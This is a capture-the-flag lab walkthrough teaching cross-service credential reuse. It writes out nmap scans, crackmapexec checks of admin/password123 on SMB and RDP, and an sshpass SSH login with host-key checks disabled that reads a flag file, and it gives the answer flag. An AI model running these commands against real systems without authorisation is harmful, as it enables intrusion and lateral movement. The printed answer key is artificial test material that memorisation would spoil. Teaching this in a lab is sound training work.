# Lab 8.2: Cross-Service Credential Reuse
## Learning Objectives
- Use SMB credentials on RDP and SSH
- Understand cross-service credential reuse
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting credential discovery.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify services are running:**
   ```bash
   nmap -p 445,3389 <target_ip>
   ```

### Step 2: Discover Credentials via SMB

Verify credentials against the SMB service using crackmapexec, then enumerate shares to confirm access.

**Detailed Steps:**

1. **Test SMB credentials with crackmapexec:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123 --shares
   ```

   Replace `<target_ip>` with your actual target IP.

   **Command breakdown:**
   - `crackmapexec smb`: Test credentials against the SMB service
   - `-u admin`: Username to test
   - `-p password123`: Password to test
   - `--shares`: Enumerate accessible shares after authentication

2. **Expected successful output:**
   ```
   SMB  <target_ip>  445  TARGET  [+] admin:password123
   SMB  <target_ip>  445  TARGET  [+] Enumerated shares
   SMB  <target_ip>  445  TARGET  Share           Permissions     Remark
   SMB  <target_ip>  445  TARGET  -----           -----------     ------
   SMB  <target_ip>  445  TARGET  private         READ,WRITE
   ```

   The `[+]` symbol confirms successful authentication. The `private` share is accessible with these credentials.

3. **Document discovered credentials:**
   - Username: `admin`
   - Password: `password123`
   - Source: Verified against SMB service

### Step 3: Verify Credential Reuse on RDP

Use crackmapexec to confirm the same SMB credentials work on the RDP service, demonstrating cross-service credential reuse.

**Detailed Steps:**

1. **Test RDP credentials with crackmapexec:**
   ```bash
   crackmapexec rdp <target_ip> -u admin -p password123
   ```

   Replace `<target_ip>` with your actual target IP.

   **Command breakdown:**
   - `crackmapexec rdp`: Test credentials against the RDP service
   - `-u admin`: Username (discovered from SMB)
   - `-p password123`: Password (discovered from SMB)

2. **Expected successful output:**
   ```
   RDP  <target_ip>  3389  TARGET  [+] admin:password123
   ```

   The `[+]` confirms the same credentials grant access to the RDP service. Both SMB and RDP accept `admin:password123`, proving cross-service credential reuse.

**What this demonstrates:**
- Credentials verified on one service (SMB) work on another service (RDP)
- Cross-service credential reuse is common in Windows environments
- Same domain accounts often authenticate to multiple services

### Step 4: Retrieve Flag via SSH

Use the same reused credentials to connect via SSH and read the flag file directly from the filesystem.

**Detailed Steps:**

1. **Connect via SSH using sshpass:**
   ```bash
   sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@<target_ip>
   ```

   Replace `<target_ip>` with your actual target IP.

   **Command breakdown:**
   - `sshpass -p 'password123'`: Supplies the password non-interactively
   - `ssh`: Opens an SSH connection
   - `-o StrictHostKeyChecking=no`: Skips host key verification prompts
   - `-o UserKnownHostsFile=/dev/null`: Prevents saving the host key
   - `admin@<target_ip>`: Connects as the admin user

2. **Read the flag file:**
   ```bash
   cat /home/admin/flag.txt
   ```

3. **Alternative: Retrieve the flag in a single command:**
   ```bash
   sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@<target_ip> 'cat /home/admin/flag.txt'
   ```

   Running the command inline avoids opening an interactive session.

4. **Expected flag content:**
   ```
   OCR{cr3d_r3us3_cr0ss}
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{cr3d_r3us3_cr0ss}
```

**Verification checklist:**
- Starts with `OCR{`
- Ends with `}`
- Contains only alphanumeric characters and underscores
- No extra spaces or characters

**Success Criteria:**
- Verified target IP and services accessibility (SMB, RDP)
- Verified SMB credentials using crackmapexec
- Documented credentials (admin/password123)
- Confirmed credential reuse on RDP using crackmapexec
- Retrieved flag from /home/admin/flag.txt via SSH
- Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Credentials often work across multiple services
- Cross-service credential reuse is a powerful attack technique
- Windows domain accounts authenticate to multiple services
- Discovering credentials on one service enables access to others
- Understanding credential reuse enables lateral movement
## Hints
1. Same credentials work on SMB, RDP, and SSH
2. Username: admin
3. Password: password123